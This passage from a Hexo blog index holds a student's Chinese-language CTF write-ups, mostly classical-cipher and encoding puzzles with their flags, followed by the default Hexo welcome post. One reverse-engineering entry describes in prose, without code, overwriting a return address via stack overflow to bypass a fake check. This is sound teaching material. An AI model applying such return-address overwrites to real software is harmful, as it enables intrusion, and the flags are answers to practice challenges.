                <img src="C:/Users/dell/Desktop/media/image78.png" alt title class>
                <p></p>
            </figure>{width=”4.666666666666667in” height=”5.448191163604549in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image79.png" alt title class>
                <p></p>
            </figure>{width=”4.583333333333333in” height=”5.350898950131233in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image80.png" alt title class>
                <p></p>
            </figure>{width=”4.770833333333333in” height=”5.569800962379703in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image81.png" alt title class>
                <p></p>
            </figure>{width=”4.833333333333333in” height=”5.642766841644795in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image83.png" alt="](C:/Users/dell/Desktop/media/image82.png){width=" 5.020833333333333in" height="5.8616688538932635in" }![" title class>
                <p>](C:/Users/dell/Desktop/media/image82.png){width="5.020833333333333in" height="5.8616688538932635in"}![</p>
            </figure>{width=”4.854166666666667in” height=”1.5457830271216098in”}<br>&gt;<br>&gt; \%7B和%7D是url编码，解出是{}<br>&gt;<br>&gt; 得到flag<br>&gt;<br>&gt; <strong>.！？</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image84.png" alt title class>
                <p></p>
            </figure>{width=”2.5208333333333335in” height=”2.7317596237970254in”}<br>&gt;<br>&gt; 使用Ook解密，直接得到flag<br>&gt;<br>&gt; <strong>+[]-</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image85.png" alt title class>
                <p></p>
            </figure>{width=”2.40625in” height=”2.5115234033245843in”}<br>&gt;<br>&gt;  Brainfuck在线解密，直接得到flag.<br>&gt;<br>&gt; <strong>奇怪的密码</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image86.png" alt title class>
                <p></p>
            </figure>{width=”2.9479166666666665in” height=”2.3533792650918635in”}<br><br>gndk€rlqhmtkwwp}z这个格式很像flag{*******}<br><br>比较一下\”gndk\”与\”flag\”的ASCII码<br><br>gndk的10进制的ASCII码分别是：103 110 100 107<br><br>flag的10进制的ASCII码分别是  ：102 108  97  103<br><br>发现ASCII以此减少 1 2 3 4，所以以此类推<br><br>使用python，把\’€\’这个字符，暂时换成别的字符，最后在换成\’{\’<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image87.png" alt title class>
                <p></p>
            </figure>{width=”4.59375in” height=”2.2094903762029747in”}<br><br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image88.png" alt title class>
                <p></p>
            </figure>{width=”5.259759405074366in” height=”1.4477362204724409in”}<br>&gt;<br>&gt; 得到flag<br>&gt;<br>&gt; <strong>托马斯.杰斐逊</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image89.png" alt title class>
                <p></p>
            </figure>{width=”2.40625in” height=”3.1265923009623795in”}<br>&gt;<br>&gt; 密码类型：转轮密码<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image90.png" alt title class>
                <p></p>
            </figure>{width=”2.4194488188976377in” height=”2.1041666666666665in”}<br>&gt;<br>&gt; 根据规则密码，在倒数第六列发现bugku字样，那此列应该就是flag<br>&gt;<br>&gt; <strong>Zip伪加密</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image92.png" alt="](C:/Users/dell/Desktop/media/image91.png){width=" 2.1875in" height="1.5964096675415573in" } ![" title class>
                <p>](C:/Users/dell/Desktop/media/image91.png){width="2.1875in" height="1.5964096675415573in"} ![</p>
            </figure>{width=”1.71875in” height=”1.693173665791776in”}<br>&gt;<br>&gt; zip伪加密是在文件头加密标志位做了修改，是文件打开是被识别为加密压缩包；将zip载入winhex修改回来即可<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image93.png" alt title class>
                <p></p>
            </figure>{width=”3.25in” height=”1.1938057742782153in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image94.png" alt title class>
                <p></p>
            </figure>{width=”3.3125in” height=”1.2063943569553806in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image95.png" alt title class>
                <p></p>
            </figure>{width=”3.0729166666666665in” height=”1.0700339020122485in”}<br>&gt;<br>&gt; <strong>告诉你个秘密</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image96.png" alt title class>
                <p></p>
            </figure>{width=”2.147635608048994in” height=”1.625in”}<br>&gt;<br>&gt; 可能是16进制，进行16进制转ASII<br>&gt;<br>&gt; 在线工具:<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">[http://www.ab126.com/goju/1711.html]{.underline}</a><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image97.png" alt title class>
                <p></p>
            </figure>{width=”3.77036198600175in” height=”2.5725951443569555in”}<br>&gt;<br>&gt; Base64解码<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image98.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”0.8173611111111111in”}<br>&gt;<br>&gt; 在线工具:<a href="http://tool.chinaz.com/tools/base64.aspx" target="_blank" rel="noopener">[http://tool.chinaz.com/tools/base64.aspx]{.underline}</a><br>&gt;<br>&gt; 通过观察可以发现，按照键盘排列，每4个一组包围着一个键，找到全部：tongyuan，提交是为大写字母<br>&gt;<br>&gt; <strong>来自宇宙的信号</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image99.png" alt title class>
                <p></p>
            </figure>{width=”4.426529965004375in” height=”0.9165518372703412in”}<br>&gt;<br>&gt; 百度查找银河语言<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image100.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.5875in”}<br>&gt;<br>&gt; 对照图表可以得到flag{norpqst}<br>&gt;<br>&gt; <strong>散乱得密文</strong><br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image101.png" alt title class>
                <p></p>
            </figure>{width=”4.125in” height=”3.2730063429571303in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image102.png" alt title class>
                <p></p>
            </figure>{width=”5.155605861767279in” height=”2.9579636920384953in”}<br><br>删去@@ 就是flag<br><br><strong>这不是MD5</strong><br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image103.png" alt title class>
                <p></p>
            </figure>{width=”5.020205599300088in” height=”3.572470472440945in”}<br><br>在线使用MD5破解发现<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image104.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.93125in”}<br><br>果然不是，猜测是不是16进制，使用converter工具<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image105.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”6.7340277777777775in”}<br><br>得到flag<br><br><strong>富强民主</strong><br><br>使用核心价值编码在线工具 <a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">[http://ctf.ssleye.com/]{.underline}</a><br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image106.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.8020833333333335in”}<br><br><strong>贝斯家族</strong><br><br>Base91 解码<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image107.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.826388888888889in”}<br><br>得到flag<br><br>在线工具：<a href="http://ctf.ssleye.com/base91.html" target="_blank" rel="noopener">http://ctf.ssleye.com/base91.html</a><br><br>二 Python3<br><br>在虚拟机上配置python环境<br><br>Python3 学习<br><br>（<a href="http://www.runoob.com/python3/python3-basic-syntax.html" target="_blank" rel="noopener">[http://www.runoob.com/python3/python3-basic-syntax.html]{.underline}</a>）<br><br>校内纳新：<br><br><strong>Crypto</strong>：<br><br>滴滴滴<br><br>首先是 摩斯密码 转换发现是16进制Text utf-8解码两次base64<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image108.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.3833333333333333in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image109.png" alt title class>
                <p></p>
            </figure>{width=”3.8in” height=”4.4565135608049in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image110.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.8513888888888888in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image111.png" alt title class>
                <p></p>
            </figure>{width=”4.032109580052493in” height=”4.708333333333333in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image112.png" alt title class>
                <p></p>
            </figure>{width=”3.5083333333333333in” height=”4.096718066491689in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image113.png" alt title class>
                <p></p>
            </figure>{width=”3.55in” height=”4.145370734908137in”}<br><br>发现flag<br><br>鸭！这大脸盘子！！！<br><br>首先是看不懂的hint，和一张图片，打开图片发现是猪圈密码；<br><br>解码得到：rweb<br><br>接着我猜测 这个hint是密文，图片解码是密钥；<br><br>应该是维吉尼亚密码，试一试<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image114.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.3833333333333333in”}<br><br>呦，果然是，但是这明显不是标准格式，根据hint ，最终flag应该是又大小写的，对照着hint改一下 就是flag{VigenereAndPigPenCipher}<br><br><strong>Misc:</strong><br><br>眼见为实？<br><br>打开文件，哇塞，好多Hex拖到notepad++，转换成ASII码，变成ANSI编码，保存文件<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image115.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.9972222222222222in”}<br><br>文件中 明显发现了一段base64，在线破解一下 发现flag<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image116.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.3833333333333333in”}<br><br>Basebasebase<br><br>困惑了，好久，base64多行解码是c++和java 没什么作用<br><br>百度查阅资料 终于发现了猫腻 原来是base64隐写<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image117.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.8055555555555554in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image118.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.8055555555555554in”}<br><br>虚拟机跑一下 ，flag出来了<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image119.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.8055555555555554in”}<br><br><strong>Reverse：</strong><br><br>听说web有送分题<br><br>把程序拖到notepad++，查找flag<br><br>发现了flag<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image120.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.6819444444444445in”}<br><br><strong>Web:</strong><br><br>网络安全法<br><br>根据hint，完成题目得到flag{DBCCCABA}<br><br>我是来送分的QAQ<br><br>根据hint 在比赛页面点击个人信息，查看鼠标右击 查看源<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image121.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.713888888888889in”}<br><br>发现flag<br><br>i_dont_like_md5<br><br>复制网址进入网页，右击查看源<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image122.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.9972222222222222in”}<br><br>这是要手工注入吗？ （听别人都这么说），那就试试<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image123.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”3.0944444444444446in”}<br><br>跟着提示走，按下F12<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image124.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”4.3694444444444445in”}<br><br>得到flag<br><br># 栈溢出：<br><br>首先进行查壳，发现无壳，程序为c++编写<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image125.png" alt title class>
                <p></p>
            </figure>{width=”2.4097222222222223in” height=”1.6388385826771654in”}<br><br>搜索字符串<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image126.png" alt title class>
                <p></p>
            </figure>{width=”4.093038057742782in” height=”2.1805555555555554in”}<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image127.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”0.6215277777777778in”}<br><br>双击进入 ，设置断点，F9运行到此处，F8单步跟踪，至输入的call<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image128.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”1.2548611111111112in”}<br><br>随便输入：flag {It_} 回车<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image129.png" alt title class>
                <p></p>
            </figure>{width=”3.8680555555555554in” height=”1.058804680664917in”}<br><br>之后F7向下，进入验证部分<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image130.png" alt title class>
                <p></p>
            </figure>{width=”5.263888888888889in” height=”2.353096019247594in”}<br><br>按照这个进行解密，会得到一个flag，但是一个假的flag<br><br>Flag{It_Is_a_Fake_check }<br><br>那么该如何令程序跳转到正确的验证部分，把程序原有的返回地址，修改为所需要返回的地址，即可<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image131.png" alt title class>
                <p></p>
            </figure>{width=”5.472222222222222in” height=”2.9344181977252846in”}<br><br>找到修改位置<br><br><figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image132.png" alt title class>
                <p></p>
            </figure>{width=”4.811898512685914in” height=”1.1352744969378827in”}<br><br>利用栈溢出，去覆盖返回地址，已达到目的<br><br>&gt; 第一：找到需要修改的地址<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image133.png" alt title class>
                <p></p>
            </figure>{width=”3.7549956255468064in” height=”1.4020800524934383in”}<br>&gt;<br>&gt; 第二：找到需要返回的地址<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image134.png" alt title class>
                <p></p>
            </figure>{width=”5.554208223972004in” height=”2.2893689851268593in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image135.png" alt title class>
                <p></p>
            </figure>{width=”5.768055555555556in” height=”2.7131944444444445in”}<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image136.png" alt title class>
                <p></p>
            </figure>{width=”3.783384733158355in” height=”1.8472222222222223in”}<br>&gt;<br>&gt; 修改成功<br>&gt;<br>&gt; 进行正确的验证<br>&gt;<br>&gt; <figure class="image-box">
                <img src="C:/Users/dell/Desktop/media/image137.png" alt title class>
                <p></p>
            </figure>{width=”3.5694444444444446in” height=”1.2648250218722659in”}<br>&gt;<br>&gt; ### 大一E网竞技纳新题：<br><br>1. 图书馆是个好地方<br><br>&gt; 下载文件为exe文件，根据内容提示输入 flag，得到一个图书序列号，可以通过超星移动图书馆，或图书馆查阅得到书名网络安全，再根据进一步提示，得到flag<br><br>1. Too fat<br><br>&gt; 文件内容为unicode编码，解密得到flag{Google_1s_4_g00d_FRI3ND}<br><br>1. Cat code<br><br>此题为颜文字，可以再控制台，或使用在线工具解码，了得到flagflag{BINGO~Y0u_4re_R1GHT}<br><br>1. Pseudo<br><br>&gt; 根据题目暗示，翻译为伪加密，百度伪加密过程，处理文件后是图片，可通过更改拓展名为txt，发现再文件底部的可以信息，为键盘密码，对应解密得到flag：flag{@HA_y0u_find_m3}<br><br><figure class="image-box">
                <img src="https://winterze-picture-bed.oss-cn-beijing.aliyuncs.com/longmao.png?Expires=1553394878&OSSAccessKeyId=TMP.AQHNiO8TKf5Z2ARMI59IB5LPrTiCBktSnBtbBpg8XovB7W9B5yMlZwA-lF7nADAtAhUA3dLuqvzTRacOz0ldTKz9MTiGeo8CFFJEs09O6TJ8ewFeooZuJzRePJVZ&Signature=OQNZhdAZD8LmDwTtKzBD7y5ni7s%3D" alt="longmao" title class>
                <p>longmao</p>
            </figure>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2019/03/21/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
